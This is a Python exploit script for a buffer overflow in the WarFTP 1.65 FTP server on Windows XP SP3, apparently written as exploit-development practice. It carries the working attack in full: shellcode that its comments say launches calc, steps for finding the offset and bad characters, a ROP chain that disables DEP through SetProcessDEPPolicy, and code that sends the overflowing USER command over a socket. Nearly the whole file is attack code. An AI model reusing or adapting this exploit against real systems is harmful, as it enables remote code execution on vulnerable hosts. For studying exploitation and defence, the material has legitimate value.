#!/usr/bin/python3

# WarFTP 1.65 - DEP & ASLR bypass
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/3570
# Exploit tested on Windows XP Pro SP3 FR with WehnTrust 1.2
import struct
import socket
import sys

# pop a calc
# As Windows Firewall ask for exception in order to listen on port 21, it is possible to bind another port with default settings.
shellcode=  b""
shellcode+= b"\xdb\xc1\xbf\x58\x10\xeb\x54\xd9\x74\x24\xf4\x5d\x33"
shellcode+= b"\xc9\xb1\x31\x31\x7d\x18\x03\x7d\x18\x83\xc5\x5c\xf2"
shellcode+= b"\x1e\xa8\xb4\x70\xe0\x51\x44\x15\x68\xb4\x75\x15\x0e"
shellcode+= b"\xbc\x25\xa5\x44\x90\xc9\x4e\x08\x01\x5a\x22\x85\x26"
shellcode+= b"\xeb\x89\xf3\x09\xec\xa2\xc0\x08\x6e\xb9\x14\xeb\x4f"
shellcode+= b"\x72\x69\xea\x88\x6f\x80\xbe\x41\xfb\x37\x2f\xe6\xb1"
shellcode+= b"\x8b\xc4\xb4\x54\x8c\x39\x0c\x56\xbd\xef\x07\x01\x1d"
shellcode+= b"\x11\xc4\x39\x14\x09\x09\x07\xee\xa2\xf9\xf3\xf1\x62"
shellcode+= b"\x30\xfb\x5e\x4b\xfd\x0e\x9e\x8b\x39\xf1\xd5\xe5\x3a"
shellcode+= b"\x8c\xed\x31\x41\x4a\x7b\xa2\xe1\x19\xdb\x0e\x10\xcd"
shellcode+= b"\xba\xc5\x1e\xba\xc9\x82\x02\x3d\x1d\xb9\x3e\xb6\xa0"
shellcode+= b"\x6e\xb7\x8c\x86\xaa\x9c\x57\xa6\xeb\x78\x39\xd7\xec"
shellcode+= b"\x23\xe6\x7d\x66\xc9\xf3\x0f\x25\x87\x02\x9d\x53\xe5"
shellcode+= b"\x05\x9d\x5b\x59\x6e\xac\xd0\x36\xe9\x31\x33\x73\x05"
shellcode+= b"\x78\x1e\xd5\x8e\x25\xca\x64\xd3\xd5\x20\xaa\xea\x55"
shellcode+= b"\xc1\x52\x09\x45\xa0\x57\x55\xc1\x58\x25\xc6\xa4\x5e"
shellcode+= b"\x9a\xe7\xec\x3c\x7d\x74\x6c\xed\x18\xfc\x17\xf1"

#!mona bp -a 0x5f44d805 -t READ

#Step 1: Replicate the crash
buffer = b"A"*550

#Step 2: Find the offset
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

#Step 3: Check the offset
buffer = b"A"*485 + b"BBBB" + b"C"*(550-485-4)

#Step 4: Find the bad chars (\x00, \0x0a, \x0d, \x40)
#As 0x40 is difficult to find, I sliced the bad chars in order to find it
badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
badchars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
badchars += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = b"A"*485 + b"BBBB" + badchars

#Step 5: Exploit
"""
ESI contains a Kernel32 address -> 7C80932E
The target address is 0x7c862144 SetProcessDEPPolicy()
Difference is 58e16

All addresses came from MFC42.DLL
"""
ret = struct.pack('<I',0x5F42C2B1)          # RETN

#First ESI -> EBP
rop_chain = struct.pack('<I',0x5f46ee55)    # MOV EAX,ESI # POP ESI # RETN 0x04
rop_chain += ret
rop_chain += struct.pack('<I',0x5f43e799)   # PUSH EAX # POP EBP # RETN
rop_chain += ret #padding
# 58e16 -> EAX
rop_chain += struct.pack('<I',0x5f417949)   # POP EAX # RETN 0x04
rop_chain += struct.pack('<I',0x11111112)
rop_chain += struct.pack('<I',0x5f49f6e1)   # XCHG EAX,EDX # DEC EDX # POP EDI # RETN
rop_chain += ret
rop_chain += ret  #padding
rop_chain += struct.pack('<I',0x5f417949)   # POP EAX # RETN 0x04
rop_chain += struct.pack('<I',0x11169f26)
rop_chain += ret  #padding
rop_chain += ret  #padding
rop_chain += struct.pack('<I',0x5f4432c1)   # INC EAX # SUB EAX,EDX # RETN 0x0C
#Add EAX (58e16) and EBP -> EAX now contains SetProcessDEPPolicy() address
rop_chain += struct.pack('<I',0x5f43fb1c)   # ADD EAX,EBP # RETN 0x02
rop_chain += ret  #padding 
rop_chain += ret  #padding
rop_chain += ret  #padding 
#Move EAX -> EBP
rop_chain += struct.pack('<I',0x5f43e799)   # PUSH EAX # POP EBP # RETN

#As a RETN 0x02 is used, we have to pad the stack
ret2_padding = b"\x90"*2
ret2_padding += struct.pack('<I',0x5F43FB1E)# RETN 0x02
ret2_padding += ret
ret2_padding += b"\x90"*2 

rop_chain += ret2_padding

#Mov 0xFFFFFFFF+1 (0) in EBX
rop_chain += struct.pack('<I',0x5f44d805)   # POP EBX # RETN
rop_chain += struct.pack('<I',0xFFFFFFFF)
rop_chain += struct.pack('<I',0x5f43eb01)   # INC EBX # POP EDI # RETN
rop_chain += ret

#Lets go
rop_chain += struct.pack('<I',0x5f423a9e)  # PUSHAD # RETN

buffer = b"A"*485 + ret + b"CCCC" + rop_chain + b"\x90"*8 + shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('127.0.0.1',21))
s.send(b"USER " + buffer + b"\r\n")
s.close()